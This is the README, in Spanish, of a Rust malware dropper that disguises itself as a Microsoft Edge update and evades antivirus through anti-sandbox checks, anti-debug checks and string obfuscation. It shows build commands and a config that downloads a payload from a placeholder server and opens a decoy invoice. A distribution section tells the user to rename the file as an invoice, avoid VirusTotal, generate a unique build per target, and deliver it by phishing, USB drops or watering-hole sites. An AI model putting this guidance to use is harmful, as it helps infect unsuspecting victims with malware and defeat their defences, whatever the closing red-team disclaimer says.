# C2R2 Rust Dropper

## Descripción

Dropper compilado en Rust diseñado para evadir Windows Defender y otros antivirus. A diferencia de los droppers basados en scripts (VBScript, JS, PowerShell, BAT), este dropper:

- **Compila a código nativo** - No requiere intérpretes
- **Strings ofuscados** - Todas las cadenas sensibles están ofuscadas en tiempo de compilación
- **Anti-Sandbox** - Detecta ambientes virtualizados y sandboxes
- **Anti-Debug** - Detecta depuradores adjuntos
- **Metadata legítimo** - Se disfraza como actualización de Microsoft Edge
- **Sin ventanas** - Ejecución completamente oculta

## Características de Evasión

### 1. Anti-Sandbox
- Verifica uptime del sistema (< 10 min = sandbox)
- Verifica número de CPUs (< 2 = VM)
- Verifica RAM física (< 4GB = VM)
- Verifica resolución de pantalla
- Verifica movimiento del mouse
- Verifica archivos recientes del usuario

### 2. Anti-Debug
- Detecta IsDebuggerPresent
- Detecta PEB BeingDebugged flag

### 3. Ofuscación
- Strings ofuscados con `obfstr` (compile-time)
- Nombres de variables genéricos
- Flujo de control con delays aleatorios

### 4. Legitimidad
- Manifest de Windows para parecer app legítima
- Version info de Microsoft Edge
- Paths de instalación legítimos (%LOCALAPPDATA%\Microsoft\Edge\...)
- User-Agent de Chrome/Edge

## Compilación

### Requisitos
```bash
# Windows target
rustup target add x86_64-pc-windows-gnu

# Cross-compilation tools (Linux)
apt install mingw-w64
```

### Build (Producción)
```bash
# Desde Linux (cross-compile)
cargo build --release --target x86_64-pc-windows-gnu --features production

# Desde Windows
cargo build --release --features production
```

### Build (Desarrollo/Test)
```bash
# Sin features de evasión
cargo build --release --target x86_64-pc-windows-gnu
```

## Configuración

Editar `src/config.rs` antes de compilar:

```rust
/// URL para descargar el payload (agent.exe)
pub const PAYLOAD_URL: &str = "https://tu-servidor.com/agent.bin";

/// Nombre del archivo a guardar
pub const PAYLOAD_FILENAME: &str = "msedge_proxy.exe";

/// Abrir documento señuelo
pub const OPEN_DECOY: bool = true;

/// URL del documento señuelo
pub const DECOY_URL: &str = "https://tu-servidor.com/factura.pdf";
```

## Uso con el Builder

El builder puede generar la configuración automáticamente:

```bash
# Futuro: integración con builder
./builder build-dropper \
    --payload-url "https://servidor.com/agent.bin" \
    --decoy-url "https://servidor.com/factura.pdf" \
    --output "Factura_2024.exe"
```

## Distribución

### Recomendaciones

1. **Hostear payload en HTTPS** - Usar dominio legítimo o CDN
2. **Renombrar ejecutable** - `Factura_Diciembre_2024.exe`, `Documento_Confidencial.exe`
3. **Cambiar icono** - Usar icono de PDF, Word, o similar
4. **No subir a VirusTotal** - Quema el payload para todos los AV
5. **Generar único por objetivo** - Evitar detección por hash

### Métodos de Entrega

- Email con adjunto comprimido (.zip, .rar con password)
- USB drop
- Watering hole (descarga desde sitio comprometido)
- Phishing link

## Estructura del Proyecto

```
dropper-rust/
├── Cargo.toml              # Configuración del proyecto
├── build.rs                # Script de build (recursos Windows)
├── dropper.manifest        # Manifest de Windows
├── src/
│   ├── main.rs            # Punto de entrada
│   ├── config.rs          # Configuración (editar antes de compilar)
│   ├── evasion.rs         # Técnicas anti-sandbox/anti-debug
│   └── delivery.rs        # Descarga y ejecución del payload
└── README.md              # Este archivo
```

## Técnicas Implementadas (MITRE ATT&CK)

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Obfuscated Files or Information | T1027 | Strings ofuscados |
| Virtualization/Sandbox Evasion | T1497 | Anti-sandbox checks |
| Process Injection | T1055 | N/A (futuro) |
| Masquerading | T1036 | Nombre/metadata legítimo |
| Ingress Tool Transfer | T1105 | Descarga de payload |
| User Execution | T1204 | Requiere click del usuario |

## Roadmap

- [ ] Integración directa con builder
- [ ] Modo embedded (payload incluido en el binario)
- [ ] Shellcode injection en proceso legítimo
- [ ] AMSI bypass
- [ ] ETW patching
- [ ] Process hollowing

## ⚠️ Disclaimer

Este software es exclusivamente para pruebas de penetración autorizadas y operaciones de red team con autorización explícita por escrito.

El uso no autorizado es ilegal y punible por ley.
